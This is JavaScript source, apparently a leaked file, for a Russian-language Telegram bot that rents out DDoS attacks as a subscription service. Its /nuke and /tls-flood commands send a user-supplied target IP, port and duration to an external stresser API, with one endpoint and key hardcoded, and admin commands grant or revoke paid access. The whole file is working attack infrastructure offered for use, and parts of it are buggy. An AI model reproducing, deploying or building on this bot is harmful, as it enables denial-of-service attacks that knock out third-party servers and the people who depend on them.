const { Telegraf } = require('telegraf'),
    request = require('request')

let USERS = [],
    ADMIN_ID = id
    API_URL = "api link"	

const SETTINGS = {
    BOT_NAME: "leak https://endway.su/members/sugfj.5528/",
    TOKEN: "token",
    OWNER_TAG: "https://endway.su/members/sugfj.5528/" 
}

const bot = new Telegraf(SETTINGS.TOKEN)

bot.command('start', async (ctx) => {
    await ctx.reply(`❗️Привет, ${ctx.from.first_name}. 
Ты попал в бота [${SETTINGS.BOT_NAME}]

Помощь по командам: /help
Перезапустить бота: /start`)
});

bot.command('help', async (ctx) => {
    await ctx.reply(`✅ Список команд:

/help: Список команд.
/start: Перезапустить бота.
/methods: Список методов.
/profile: Твой профиль в боте.
/admin: Админ команды.`)
});

bot.command('methods', async (ctx) => {
    await ctx.reply(`✅ Список методов:

Используйте: /метод айпи порт время_атаки

/nuke: nuke l7 метод.
/tls-flood: tls l7 метод.`)
});

bot.command('nuke', async (ctx) => {
    if (await checkVip(ctx.from.id) === true) {
        if (ctx.message.text.split(' ').length === 4) {
            await request.get(`http://a0787810.xsph.ru/api/api2.php?key=key&host=${ctx.message.text.split(' ')[1]}&port=${ctx.message.text.split(' ')[2]}&time=${ctx.message.text.split(' ')[3]}&method=test`)
            await ctx.reply(`💣 Атака успешно запущена!`)
        } else {
            await ctx.reply(`❗️Использование: /nuke айпи порт время_атаки`)
        }
    } else {
        await ctx.reply(`❗️ Пожайлуста купите подписку у @${SETTINGS.OWNER_TAG}!`)
    }
});

bot.command('tls-flood', async (ctx) => {
    if (await checkVip(ctx.from.id) === true) {
        if (ctx.message.text.split(' ').length === 4) {
            await request.get(`https://${API_URL}/api.php?key=hlvm6odu3dxhdew&host=${ctx.message.text.split(' ')[1]}&port=${ctx.message.text.split(' ')[2]}&time=${ctx.message.text.split(' ')[3]}&method=TCP`)
            await ctx.reply(`💣 Атака успешно запущена!`)
        } else {
            await ctx.reply(`❗️Использование: /tcp айпи порт время_атаки`)
        }
    } else {
        await ctx.reply(`❗️ Пожайлуста купите подписку у @${SETTINGS.OWNER_TAG}!`)
    }
});

bot.command('admin', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        await ctx.reply(`💣 Список АДМИН команд:

/listusers: Список пользователей.
/adduser: Добавить пользователя.
/deluser: Удалить пользователя.`)
    } else {
        await ctx.reply(`❗️ У вас нету прав администратора!`)
    }
});

bot.command('adduser', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        if (ctx.message.text.split(' ').length === 2) {
            USERS.push(ctx.message.text.split(' ')[1])
            bot.telegram.sendMessage(Number(ctx.message.text.split(' ')[1]), '❗️Администратор выдал вам доступ!')
            await ctx.reply(`✅ Пользователь под ID ${ctx.message.text.split(' ')[1]} был успешно добавлен!`)
        } else {
            await ctx.reply(`❗️Использование: /adduser айди_пользователя`)
        }
    } else {
        await ctx.reply(`❗️ У вас нету прав администратора!`)
    }
});

bot.command('deluser', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        if (ctx.message.text.split(' ').length === 2) {
            let SUCCESS = false
            for (let i = 0; i < USERS.length; i++) {
                if (ctx.message.text.split(' ')[1] === USERS[i]) {
                    USERS.splice(USERS, i)
                    SUCCESS = true
                }
            }
            if (SUCCESS === true) {
                bot.telegram.sendMessage(Number(ctx.message.text.split(' ')[1]), '❗️Администратор забрал у вас доступ!')
                await ctx.reply(`✅ Пользователь под ID ${ctx.message.text.split(' ')[1]} был успешно удален!`)
            } else {
                await ctx.reply(`❗️Пользователь не был найден!`)
            }
        } else {
            await ctx.reply(`❗️Использование: /deluser айди_пользователя`)
        }
    } else {
        await ctx.reply(`❗️ У вас нету прав администратора!`)
    }
});

bot.command('listusers', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
            let listusers = ""
            for (let i = 0; i < USERS.length; i++) {
                if (USERS[i] !== '') {
                    listusers += "- "+USERS[i] + "\n"
                }
            }
            await ctx.reply(`✅ Список пользователей:\n\n${listusers}`)
    } else {
        await ctx.reply(`❗️ У вас нету прав администратора!`)
    }
});

bot.command('profile', async (ctx) => {
    let VIP = "НЕТУ",
        ADMIN = "НЕТУ"
    if (await checkVip(ctx.from.id) === true) {
        VIP = "ЕСТЬ"
    }
    if (ctx.from.id === ADMIN_ID) {
        ADMIN = "ЕСТЬ"
    }
    await ctx.reply(`✏️ Ваш профиль:

- ID: ${ctx.from.id}
- Имя: [${ctx.from.first_name}]
- VIP Доступ: [${VIP}]
- Админка: [${ADMIN}]`)
});

bot.launch()

async function checkVip(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i]) {
            return true
        }
    }
    return false
}

console.log(`${SETTINGS.BOT_NAME} | Бот запущен!`)